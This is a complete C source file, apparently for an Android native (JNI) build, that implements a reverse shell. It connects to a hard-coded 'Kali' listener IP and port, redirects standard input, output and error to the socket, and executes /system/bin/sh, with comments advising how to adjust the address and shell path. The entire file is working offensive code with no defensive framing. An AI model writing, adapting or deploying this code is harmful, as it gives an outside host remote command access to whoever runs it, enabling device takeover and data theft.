// jni/main.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

// --- CONFIGURATION ---
#define KALI_IP "192.168.1.16" // <<< IMPORTANT: REPLACE THIS
#define KALI_PORT 5555
// --- END CONFIGURATION ---

int main(int argc, char *argv[]) {
    struct sockaddr_in server_addr;
    int sockfd;

    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Error creating socket");
        return 1;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(KALI_PORT);
    server_addr.sin_addr.s_addr = inet_addr(KALI_IP);

    // Connect to Kali listener
    if (connect(sockfd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Error connecting to server");
        close(sockfd);
        return 1;
    }

    // Redirect stdin, stdout, stderr to the socket
    dup2(sockfd, 0); // stdin
    dup2(sockfd, 1); // stdout
    dup2(sockfd, 2); // stderr

    // Execute /system/bin/sh
    // Note: Android might restrict /bin/sh for apps. /system/bin/sh is common.
    // If this doesn't work, try other shell paths or a simpler command for testing.
    char *shell_args[] = {"/system/bin/sh", NULL};
    execve("/system/bin/sh", shell_args, NULL);

    // execve only returns on error
    perror("Error executing shell");
    close(sockfd);
    return 1;
}